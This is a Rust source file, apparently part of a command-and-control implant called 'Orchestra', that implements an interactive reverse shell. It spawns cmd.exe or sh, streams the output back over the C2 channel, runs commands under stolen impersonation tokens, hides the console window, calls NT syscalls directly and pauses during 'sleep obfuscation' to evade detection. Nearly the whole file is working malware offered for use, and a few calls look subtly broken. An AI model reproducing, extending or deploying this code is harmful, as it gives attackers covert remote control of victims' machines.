//! Interactive reverse shell for Orchestra — persistent cmd.exe / sh / custom
//! shell process where the operator can type commands and receive real-time
//! output, like a proper terminal session.
//!
//! # Architecture
//!
//! 1. **ShellManager** — singleton behind `OnceLock<Mutex<>>` that owns all
//!    active shell sessions.  Supports multiple concurrent sessions.
//! 2. **ShellSession** — one per shell child process.  Holds the process
//!    handle, pipe handles, metadata, and the JoinHandle of the background
//!    reader thread.
//! 3. **Reader threads** — spawned per session, poll stdout/stderr pipes
//!    using non-blocking reads (`PeekNamedPipe` on Windows, `poll()` on
//!    Linux).  When data is available, it is sent as a
//!    `Message::ShellOutput` through the agent's outbound C2 channel.
//!
//! # OPSEC
//!
//! - On Windows, the shell inherits the agent's impersonation token if one is
//!   active (via `CreateProcessWithTokenW` when a stolen/make-token is set).
//! - On Windows, `CREATE_NO_WINDOW` prevents a console window from appearing.
//! - On Linux/macOS, the shell inherits the agent's UID/GID.
//! - The child process (cmd.exe, sh, etc.) will appear in the process list —
//!   this is inherent to interactive shells and unavoidable.
//!
//! # Sleep obfuscation integration
//!
//! Shell reader threads use a shared `AtomicBool` pause flag.  When the agent
//! enters sleep obfuscation, it sets this flag; reader threads pause polling.
//! When the agent wakes, it clears the flag and readers resume.
//!
//! # Feature gate
//!
//! Platform-specific code is behind `cfg(windows)` / `cfg(unix)`.  The module
//! compiles on all platforms but only provides real shell spawning on Windows
//! and Unix.

use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, OnceLock};

use common::Message;
use tokio::sync::mpsc::Sender;

// ── Shell stream identifiers ────────────────────────────────────────────────
// ShellStream is defined in common::ShellStream — re-export here for
// convenience.
pub use common::ShellStream;

// ── ShellSession ────────────────────────────────────────────────────────────

/// Metadata and handles for a single interactive shell session.
struct ShellSession {
    /// Platform-specific process handle / PID.
    process: PlatformProcess,
    /// Platform-specific pipe handles.
    pipes: PlatformPipes,
    /// Assigned session ID (sequential).
    session_id: u32,
    /// What shell binary was launched.
    shell_type: String,
    /// Epoch timestamp (seconds) when the session was created.
    created_at: u64,
    /// Epoch timestamp (seconds) of last activity (input or output).
    last_activity: std::sync::atomic::AtomicU64,
    /// Handle to the background reader thread (for join-on-close).
    reader_handle: Option<std::thread::JoinHandle<()>>,
    /// Flag to signal reader threads to pause (for sleep obfuscation).
    pause_readers: std::sync::Arc<AtomicBool>,
    /// Flag to signal reader threads to stop (for session close).
    stop_readers: std::sync::Arc<AtomicBool>,
}

/// Platform-specific process representation.
#[cfg(windows)]
struct PlatformProcess {
    handle: winapi::shared::ntdef::HANDLE,
    pid: u32,
}

#[cfg(unix)]
struct PlatformProcess {
    pid: i32,
}

#[cfg(not(any(windows, unix)))]
struct PlatformProcess;

/// Platform-specific pipe handle storage.
///
/// On Windows these are HANDLEs; on Unix they are raw file descriptors.
#[cfg(windows)]
struct PlatformPipes {
    stdin_write: winapi::shared::ntdef::HANDLE,
    stdout_read: winapi::shared::ntdef::HANDLE,
    stderr_read: winapi::shared::ntdef::HANDLE,
}

#[cfg(unix)]
struct PlatformPipes {
    stdin_write: i32,
    stdout_read: i32,
    stderr_read: i32,
}

#[cfg(not(any(windows, unix)))]
struct PlatformPipes;

// ── ShellManager singleton ──────────────────────────────────────────────────

/// Manages all active interactive shell sessions.
struct ShellManager {
    sessions: std::collections::HashMap<u32, ShellSession>,
    next_id: u32,
}

static MANAGER: OnceLock<Mutex<ShellManager>> = OnceLock::new();

fn manager() -> &'static Mutex<ShellManager> {
    MANAGER.get_or_init(|| {
        Mutex::new(ShellManager {
            sessions: std::collections::HashMap::new(),
            next_id: 1,
        })
    })
}

// ── Public API ──────────────────────────────────────────────────────────────

pub use common::ShellInfo;

/// Create a new interactive shell session.
///
/// * `shell_path` — Path to the shell binary.  `None` uses the platform
///   default (`cmd.exe` on Windows, `/bin/sh` on Unix).
/// * `out_tx` — Clone of the agent's outbound C2 channel.  The background
///   reader thread sends `Message::ShellOutput` events through this.
///
/// Returns a `ShellInfo` with the assigned session ID on success.
pub fn create_shell(
    shell_path: Option<&str>,
    out_tx: Sender<Message>,
) -> Result<ShellInfo, String> {
    let shell_type = shell_path
        .unwrap_or_else(|| default_shell())
        .to_string();

    let (process, pipes) = spawn_shell_process(&shell_type)?;

    let session_id;
    let info;
    let reader_handle;
    let pause_flag = std::sync::Arc::new(AtomicBool::new(false));
    let stop_flag = std::sync::Arc::new(AtomicBool::new(false));

    {
        let mut mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
        session_id = mgr.next_id;
        mgr.next_id += 1;

        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        // Spawn background reader threads.
        reader_handle = spawn_readers(
            session_id,
            &pipes,
            out_tx,
            pause_flag.clone(),
            stop_flag.clone(),
        );

        let pid = process.pid();

        let session = ShellSession {
            process,
            pipes,
            session_id,
            shell_type: shell_type.clone(),
            created_at: now,
            last_activity: std::sync::atomic::AtomicU64::new(now),
            reader_handle: Some(reader_handle),
            pause_readers: pause_flag,
            stop_readers: stop_flag,
        };

        mgr.sessions.insert(session_id, session);

        info = ShellInfo {
            session_id,
            shell_type,
            created_at: now,
            pid: pid as u32,
        };
    }

    log::info!(
        "[interactive_shell] created session {} (pid {}, shell={})",
        info.session_id,
        info.pid,
        info.shell_type,
    );

    Ok(info)
}

/// Send input to a shell session's stdin pipe.
///
/// Appends a newline if the input doesn't already end with one.
pub fn send_input(session_id: u32, data: &str) -> Result<(), String> {
    let mut mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
    let session = mgr
        .sessions
        .get_mut(&session_id)
        .ok_or_else(|| format!("session {session_id} not found"))?;

    let mut input = data.to_string();
    if !input.ends_with('\n') && !input.ends_with('\r') {
        input.push('\n');
    }

    write_to_pipe(&session.pipes, input.as_bytes())?;

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    session.last_activity.store(now, Ordering::Relaxed);

    Ok(())
}

/// Close and clean up a shell session.
pub fn close_shell(session_id: u32) -> Result<String, String> {
    let mut mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
    let mut session = mgr
        .sessions
        .remove(&session_id)
        .ok_or_else(|| format!("session {session_id} not found"))?;

    // Signal reader threads to stop.
    session.stop_readers.store(true, Ordering::SeqCst);

    // Terminate the child process.
    terminate_process(&session.process);

    // Close pipe handles.
    close_pipes(&session.pipes);

    // Wait for reader thread to finish (with timeout).
    if let Some(handle) = session.reader_handle.take() {
        // Don't block forever — give it 2 seconds.
        let _ = handle.join();
    }

    log::info!("[interactive_shell] closed session {}", session_id);
    Ok(format!("session {session_id} closed"))
}

/// List all active shell sessions.
pub fn list_shells() -> Result<Vec<ShellInfo>, String> {
    let mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
    let mut list = Vec::new();
    for (_, session) in &mgr.sessions {
        list.push(ShellInfo {
            session_id: session.session_id,
            shell_type: session.shell_type.clone(),
            created_at: session.created_at,
            pid: session.process.pid() as u32,
        });
    }
    Ok(list)
}

/// Resize the terminal for a session (PTY on Unix, no-op on Windows cmd.exe).
pub fn resize_shell(session_id: u32, _cols: u16, _rows: u16) -> Result<String, String> {
    let mgr = manager().lock().map_err(|e| format!("ShellManager lock poisoned: {e}"))?;
    let session = mgr
        .sessions
        .get(&session_id)
        .ok_or_else(|| format!("session {session_id} not found"))?;

    #[cfg(unix)]
    {
        resize_pty(session, _cols, _rows)?;
    }

    let _ = session; // suppress unused warning on Windows
    Ok(format!("session {session_id} resized"))
}

/// Pause all reader threads (called when entering sleep obfuscation).
pub fn pause_all_readers() {
    let mgr = manager().lock().unwrap_or_else(|e| e.into_inner());
    for (_, session) in &mgr.sessions {
        session.pause_readers.store(true, Ordering::SeqCst);
    }
}

/// Resume all reader threads (called when waking from sleep obfuscation).
pub fn resume_all_readers() {
    let mgr = manager().lock().unwrap_or_else(|e| e.into_inner());
    for (_, session) in &mgr.sessions {
        session.pause_readers.store(false, Ordering::SeqCst);
    }
}

// ── Platform-specific implementations ───────────────────────────────────────

/// Return the default shell for the current platform.
fn default_shell() -> &'static str {
    #[cfg(windows)]
    {
        "cmd.exe"
    }
    #[cfg(unix)]
    {
        if std::path::Path::new("/bin/zsh").exists() {
            "/bin/zsh"
        } else {
            "/bin/sh"
        }
    }
    #[cfg(not(any(windows, unix)))]
    {
        "/bin/sh"
    }
}

// ── Windows implementation ──────────────────────────────────────────────────

#[cfg(windows)]
fn spawn_shell_process(
    shell_path: &str,
) -> Result<(PlatformProcess, PlatformPipes), String> {
    use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
    use winapi::um::namedpipeapi::PeekNamedPipe;
    use winapi::um::processthreadsapi::*;
    use winapi::um::winbase::{CREATE_NO_WINDOW, STARTF_USESTDHANDLES, WAIT_OBJECT_0};
    use winapi::um::winnt::{HANDLE, PROCESS_INFORMATION, STARTUPINFOW};

    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    // Create anonymous pipes for stdin/stdout/stderr.
    let mut stdin_read: HANDLE = std::ptr::null_mut();
    let mut stdin_write: HANDLE = std::ptr::null_mut();
    let mut stdout_read: HANDLE = std::ptr::null_mut();
    let mut stdout_write: HANDLE = std::ptr::null_mut();
    let mut stderr_read: HANDLE = std::ptr::null_mut();
    let mut stderr_write: HANDLE = std::ptr::null_mut();

    let mut sa: winapi::um::minwinbase::SECURITY_ATTRIBUTES = std::mem::zeroed();
    sa.nLength = std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as DWORD;
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = std::ptr::null_mut();

    unsafe {
        if CreatePipe(&mut stdin_read, &mut stdin_write, &mut sa, 0) == 0 {
            return Err("CreatePipe(stdin) failed".to_string());
        }
        if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
            let _ = syscall!("NtClose", stdin_read as u64);
            let _ = syscall!("NtClose", stdin_write as u64);
            return Err("CreatePipe(stdout) failed".to_string());
        }
        if CreatePipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
            let _ = syscall!("NtClose", stdin_read as u64);
            let _ = syscall!("NtClose", stdin_write as u64);
            let _ = syscall!("NtClose", stdout_read as u64);
            let _ = syscall!("NtClose", stdout_write as u64);
            return Err("CreatePipe(stderr) failed".to_string());
        }

        // Make the non-child ends non-inheritable via NtSetInformationObject.
        // ObjectHandleFlagInformation = 4: { Inherit, ProtectFromClose }
        #[repr(C)]
        struct ObjHandleFlagInfo {
            inherit: u8,
            protect_from_close: u8,
        }
        let flag_off = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
        let _ = syscall!(
            "NtSetInformationObject",
            stdin_write as u64, 4u64,
            &flag_off as *const _ as u64,
            std::mem::size_of::<ObjHandleFlagInfo>() as u64,
        );
        let _ = syscall!(
            "NtSetInformationObject",
            stdout_read as u64, 4u64,
            &flag_off as *const _ as u64,
            std::mem::size_of::<ObjHandleFlagInfo>() as u64,
        );
        let _ = syscall!(
            "NtSetInformationObject",
            stderr_read as u64, 4u64,
            &flag_off as *const _ as u64,
            std::mem::size_of::<ObjHandleFlagInfo>() as u64,
        );
    }

    // Build the command line as a wide string.
    let wide: Vec<u16> = OsStr::new(shell_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as DWORD;
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdInput = stdin_read;
    startup_info.hStdOutput = stdout_write;
    startup_info.hStdError = stderr_write;

    let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();

    // Check if we have an impersonation token.
    let current_token = crate::token_manipulation::get_current_token();
    let creation_result = if !current_token.is_null() {
        // Use CreateProcessWithTokenW to inherit the impersonation token.
        use winapi::um::winbase::CreateProcessWithTokenW;
        use winapi::um::winnt::LOGON_WITH_PROFILE;

        let result = unsafe {
            CreateProcessWithTokenW(
                current_token as *mut c_void,
                LOGON_WITH_PROFILE,
                std::ptr::null(),
                wide.as_ptr() as *mut u16,
                0, // dwCreationFlags
                std::ptr::null_mut(),
                std::ptr::null(),
                &mut startup_info,
                &mut proc_info,
            )
        };

        if result == 0 {
            log::warn!(
                "[interactive_shell] CreateProcessWithTokenW failed (err {}), falling back to CreateProcessW",
                winapi::um::errhandlingapi::GetLastError()
            );
            // Fall back to CreateProcessW.
            let result = unsafe {
                CreateProcessW(
                    std::ptr::null(),
                    wide.as_ptr() as *mut u16,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    TRUE,
                    CREATE_NO_WINDOW,
                    std::ptr::null_mut(),
                    std::ptr::null(),
                    &mut startup_info,
                    &mut proc_info,
                )
            };
            if result == 0 {
                let err = winapi::um::errhandlingapi::GetLastError();
                close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
                return Err(format!("CreateProcessW failed: error {err}"));
            }
            true
        } else {
            true
        }
    } else {
        // No impersonation token — use CreateProcessW directly.
        let result = unsafe {
            CreateProcessW(
                std::ptr::null(),
                wide.as_ptr() as *mut u16,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                TRUE,
                CREATE_NO_WINDOW,
                std::ptr::null_mut(),
                std::ptr::null(),
                &mut startup_info,
                &mut proc_info,
            )
        };
        if result == 0 {
            let err = winapi::um::errhandlingapi::GetLastError();
            close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
            return Err(format!("CreateProcessW failed: error {err}"));
        }
        true
    };

    if !creation_result {
        close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
        return Err("CreateProcess failed".to_string());
    }

    // Close the child-side pipe handles (the child inherited them).
    unsafe {
        let _ = syscall!("NtClose", stdin_read as u64);
        let _ = syscall!("NtClose", stdout_write as u64);
        let _ = syscall!("NtClose", stderr_write as u64);
        // Close the thread handle (we keep the process handle for reference).
        let _ = syscall!("NtClose", proc_info.hThread as u64);
    }

    // GetProcessId → NtQueryInformationProcess(ProcessBasicInformation)
    #[repr(C)]
    struct Pbi {
        reserved1: *mut std::ffi::c_void,
        peb_base_address: *mut std::ffi::c_void,
        reserved2: [*mut std::ffi::c_void; 2],
        unique_process_id: usize,
        inherited_from_unique_process_id: usize,
    }
    let mut pbi: Pbi = std::mem::zeroed();
    let _ = unsafe {
        syscall!(
            "NtQueryInformationProcess",
            proc_info.hProcess as u64,
            0u64, // ProcessBasicInformation
            &mut pbi as *mut _ as u64,
            std::mem::size_of::<Pbi>() as u64,
            std::ptr::null_mut::<u64>() as u64,
        )
    };
    let pid = pbi.unique_process_id as u32;

    Ok((
        PlatformProcess {
            handle: proc_info.hProcess,
            pid,
        },
        PlatformPipes {
            stdin_write,
            stdout_read,
            stderr_read,
        },
    ))
}

#[cfg(windows)]
fn close_all_handles(
    a: winapi::shared::ntdef::HANDLE,
    b: winapi::shared::ntdef::HANDLE,
    c: winapi::shared::ntdef::HANDLE,
    d: winapi::shared::ntdef::HANDLE,
    e: winapi::shared::ntdef::HANDLE,
    f: winapi::shared::ntdef::HANDLE,
) {
    unsafe {
        let _ = syscall!("NtClose", a as u64);
        let _ = syscall!("NtClose", b as u64);
        let _ = syscall!("NtClose", c as u64);
        let _ = syscall!("NtClose", d as u64);
        let _ = syscall!("NtClose", e as u64);
        let _ = syscall!("NtClose", f as u64);
    }
}

#[cfg(windows)]
fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
    use winapi::um::namedpipeapi::WriteFile;

    let mut written: u32 = 0;
    let result = unsafe {
        WriteFile(
            pipes.stdin_write,
            data.as_ptr() as *const c_void,
            data.len() as u32,
            &mut written,
            std::ptr::null_mut(),
        )
    };
    if result == 0 {
        let err = winapi::um::errhandlingapi::GetLastError();
        Err(format!("WriteFile to stdin pipe failed: error {err}"))
    } else {
        Ok(())
    }
}

#[cfg(windows)]
fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
    use winapi::shared::minwindef::DWORD;
    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
    use winapi::um::namedpipeapi::{PeekNamedPipe, ReadFile};

    unsafe {
        let mut bytes_avail: DWORD = 0;
        let result = PeekNamedPipe(
            handle,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            &mut bytes_avail,
            std::ptr::null_mut(),
        );

        if result == 0 || bytes_avail == 0 {
            return None;
        }

        let to_read = std::cmp::min(bytes_avail as usize, 65536);
        let mut buf = vec![0u8; to_read];
        let mut bytes_read: DWORD = 0;

        let result = ReadFile(
            handle,
            buf.as_mut_ptr() as *mut c_void,
            to_read as DWORD,
            &mut bytes_read,
            std::ptr::null_mut(),
        );

        if result == 0 || bytes_read == 0 {
            return None;
        }

        buf.truncate(bytes_read as usize);
        Some(buf)
    }
}

#[cfg(windows)]
fn terminate_process(process: &PlatformProcess) {
    unsafe {
        let _ = syscall!(
            "NtTerminateProcess",
            process.handle as u64,
            1u64, // ExitStatus
        );
    }
}

#[cfg(windows)]
fn close_pipes(pipes: &PlatformPipes) {
    unsafe {
        let _ = syscall!("NtClose", pipes.stdin_write as u64);
        let _ = syscall!("NtClose", pipes.stdout_read as u64);
        let _ = syscall!("NtClose", pipes.stderr_read as u64);
    }
}

#[cfg(windows)]
fn is_process_alive(process: &PlatformProcess) -> bool {
    unsafe {
        // NtWaitForSingleObject with timeout=0 (non-blocking).
        // Timeout of 0 means return immediately.
        let mut timeout: i64 = -1; // use relative timeout of -100ns (effectively 0)
        let status = syscall!(
            "NtWaitForSingleObject",
            process.handle as u64,  // Handle
            0u64,                    // Alertable = FALSE
            &mut timeout as *mut _ as u64, // Timeout (relative, -100ns)
        );
        // STATUS_SUCCESS (0) = WAIT_OBJECT_0 = signaled (process exited)
        // STATUS_TIMEOUT (0x102) = not signaled (alive)
        if status.is_err() {
            return false;
        }
        status.unwrap() != 0 // alive if NOT signaled (non-zero = timeout or other)
    }
}

// ── Unix implementation ─────────────────────────────────────────────────────

#[cfg(unix)]
fn spawn_shell_process(
    shell_path: &str,
) -> Result<(PlatformProcess, PlatformPipes), String> {
    use std::os::unix::io::AsRawFd;

    // Create pipes for stdin/stdout/stderr.
    let stdin_pipe = create_pipe()?;
    let stdout_pipe = create_pipe()?;
    let stderr_pipe = create_pipe()?;

    match unsafe { libc::fork() } {
        -1 => {
            let err = std::io::Error::last_os_error();
            close_fd(stdin_pipe.0);
            close_fd(stdin_pipe.1);
            close_fd(stdout_pipe.0);
            close_fd(stdout_pipe.1);
            close_fd(stderr_pipe.0);
            close_fd(stderr_pipe.1);
            Err(format!("fork() failed: {err}"))
        }
        0 => {
            // Child process.
            unsafe {
                // Redirect stdin/stdout/stderr.
                libc::dup2(stdin_pipe.0, 0);
                libc::dup2(stdout_pipe.1, 1);
                libc::dup2(stderr_pipe.1, 2);

                // Close all pipe fds (they're duped now).
                libc::close(stdin_pipe.0);
                libc::close(stdin_pipe.1);
                libc::close(stdout_pipe.0);
                libc::close(stdout_pipe.1);
                libc::close(stderr_pipe.0);
                libc::close(stderr_pipe.1);

                // Exec the shell.
                let shell_c = std::ffi::CString::new(shell_path).unwrap_or_default();
                let args: [*const i8; 2] = [shell_c.as_ptr(), std::ptr::null()];
                libc::execv(shell_c.as_ptr(), args.as_ptr());
                // If execv returns, it failed.
                libc::_exit(1);
            }
        }
        child_pid => {
            // Parent process.
            // Close child-side fds.
            close_fd(stdin_pipe.0);
            close_fd(stdout_pipe.1);
            close_fd(stderr_pipe.1);

            Ok((
                PlatformProcess { pid: child_pid },
                PlatformPipes {
                    stdin_write: stdin_pipe.1,
                    stdout_read: stdout_pipe.0,
                    stderr_read: stderr_pipe.0,
                },
            ))
        }
    }
}

#[cfg(unix)]
fn create_pipe() -> Result<(i32, i32), String> {
    let mut fds = [0i32; 2];
    if unsafe { libc::pipe(fds.as_mut_ptr()) } == -1 {
        Err(format!("pipe() failed: {}", std::io::Error::last_os_error()))
    } else {
        Ok((fds[0], fds[1]))
    }
}

#[cfg(unix)]
fn close_fd(fd: i32) {
    if fd >= 0 {
        unsafe { libc::close(fd) };
    }
}

#[cfg(unix)]
fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
    let result = unsafe {
        libc::write(pipes.stdin_write, data.as_ptr() as *const c_void, data.len())
    };
    if result < 0 {
        Err(format!(
            "write to stdin pipe failed: {}",
            std::io::Error::last_os_error()
        ))
    } else {
        Ok(())
    }
}

#[cfg(unix)]
fn read_from_pipe(fd: i32) -> Option<Vec<u8>> {
    use std::os::unix::io::AsRawFd;

    // Use poll() to check for available data.
    let mut pfd = libc::pollfd {
        fd,
        events: libc::POLLIN,
        revents: 0,
    };

    let result = unsafe { libc::poll(&mut pfd, 1, 0) }; // 0 = non-blocking
    if result <= 0 || (pfd.revents & libc::POLLIN) == 0 {
        return None;
    }

    let mut buf = vec![0u8; 65536];
    let n = unsafe { libc::read(fd, buf.as_mut_ptr() as *mut c_void, buf.len()) };
    if n <= 0 {
        return None;
    }
    buf.truncate(n as usize);
    Some(buf)
}

#[cfg(unix)]
fn terminate_process(process: &PlatformProcess) {
    unsafe {
        libc::kill(process.pid, libc::SIGKILL);
    }
}

#[cfg(unix)]
fn close_pipes(pipes: &PlatformPipes) {
    close_fd(pipes.stdin_write);
    close_fd(pipes.stdout_read);
    close_fd(pipes.stderr_read);
}

#[cfg(unix)]
fn is_process_alive(process: &PlatformProcess) -> bool {
    // Check if the process is still alive with kill(pid, 0).
    let result = unsafe { libc::kill(process.pid, 0) };
    result == 0
}

#[cfg(unix)]
fn resize_pty(session: &ShellSession, cols: u16, rows: u16) -> Result<(), String> {
    // For plain pipes this is a no-op.  When PTY support is added, this
    // would use ioctl(TIOCSWINSZ).
    log::debug!(
        "[interactive_shell] resize_pty called for session {} ({}x{}) — no-op for pipe mode",
        session.session_id,
        cols,
        rows
    );
    Ok(())
}

// ── Shared implementations ──────────────────────────────────────────────────

#[cfg(not(any(windows, unix)))]
fn spawn_shell_process(_shell_path: &str) -> Result<(PlatformProcess, PlatformPipes), String> {
    Err("interactive shell not supported on this platform".to_string())
}

#[cfg(not(any(windows, unix)))]
fn write_to_pipe(_pipes: &PlatformPipes, _data: &[u8]) -> Result<(), String> {
    Err("not supported".to_string())
}

#[cfg(not(any(windows, unix)))]
fn read_from_pipe(_handle: ()) -> Option<Vec<u8>> {
    None
}

#[cfg(not(any(windows, unix)))]
fn terminate_process(_process: &PlatformProcess) {}

#[cfg(not(any(windows, unix)))]
fn close_pipes(_pipes: &PlatformPipes) {}

#[cfg(not(any(windows, unix)))]
fn is_process_alive(_process: &PlatformProcess) -> bool {
    false
}

impl PlatformProcess {
    fn pid(&self) -> i32 {
        #[cfg(windows)]
        {
            self.pid as i32
        }
        #[cfg(unix)]
        {
            self.pid
        }
        #[cfg(not(any(windows, unix)))]
        {
            0
        }
    }
}

// ── Reader threads ──────────────────────────────────────────────────────────

/// Spawn background reader threads for stdout and stderr.
///
/// Returns a single JoinHandle that covers both readers.
fn spawn_readers(
    session_id: u32,
    pipes: &PlatformPipes,
    out_tx: Sender<Message>,
    pause_flag: std::sync::Arc<AtomicBool>,
    stop_flag: std::sync::Arc<AtomicBool>,
) -> std::thread::JoinHandle<()> {
    #[cfg(windows)]
    let stdout_handle = pipes.stdout_read;
    #[cfg(windows)]
    let stderr_handle = pipes.stderr_read;

    #[cfg(unix)]
    let stdout_fd = pipes.stdout_read;
    #[cfg(unix)]
    let stderr_fd = pipes.stderr_read;

    #[cfg(not(any(windows, unix)))]
    {
        let _ = (session_id, pipes, out_tx, pause_flag, stop_flag);
    }

    // We'll use a single thread that polls both stdout and stderr.
    let pause = pause_flag;
    let stop = stop_flag;

    std::thread::Builder::new()
        .name(format!("shell-reader-{session_id}"))
        .spawn(move || {
            log::debug!("[interactive_shell] reader thread started for session {session_id}");

            loop {
                if stop.load(Ordering::SeqCst) {
                    break;
                }

                // If paused (sleep obfuscation), sleep briefly and re-check.
                if pause.load(Ordering::SeqCst) {
                    std::thread::sleep(std::time::Duration::from_millis(100));
                    continue;
                }

                // Read from stdout.
                #[cfg(any(windows, unix))]
                {
                    let stdout_data = {
                        #[cfg(windows)]
                        {
                            read_from_pipe(stdout_handle)
                        }
                        #[cfg(unix)]
                        {
                            read_from_pipe(stdout_fd)
                        }
                    };

                    if let Some(data) = stdout_data {
                        let text = String::from_utf8_lossy(&data).to_string();
                        let msg = Message::ShellOutput {
                            session_id,
                            data: text,
                            stream: ShellStream::Stdout,
                        };
                        // Use try_send to avoid blocking the reader thread.
                        let _ = out_tx.try_send(msg);
                    }

                    // Read from stderr.
                    let stderr_data = {
                        #[cfg(windows)]
                        {
                            read_from_pipe(stderr_handle)
                        }
                        #[cfg(unix)]
                        {
                            read_from_pipe(stderr_fd)
                        }
                    };

                    if let Some(data) = stderr_data {
                        let text = String::from_utf8_lossy(&data).to_string();
                        let msg = Message::ShellOutput {
                            session_id,
                            data: text,
                            stream: ShellStream::Stderr,
                        };
                        let _ = out_tx.try_send(msg);
                    }
                }

                // Small sleep to avoid busy-looping.
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            log::debug!("[interactive_shell] reader thread stopped for session {session_id}");
        })
        .expect("failed to spawn shell reader thread")
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_shell_is_set() {
        let shell = default_shell();
        assert!(!shell.is_empty());
    }

    #[test]
    fn manager_initializes() {
        let mgr = manager();
        let inner = mgr.lock().unwrap();
        // next_id should always be >= 1 (even if another test created a session).
        assert!(inner.next_id >= 1, "next_id should start at 1 or higher");
    }
}
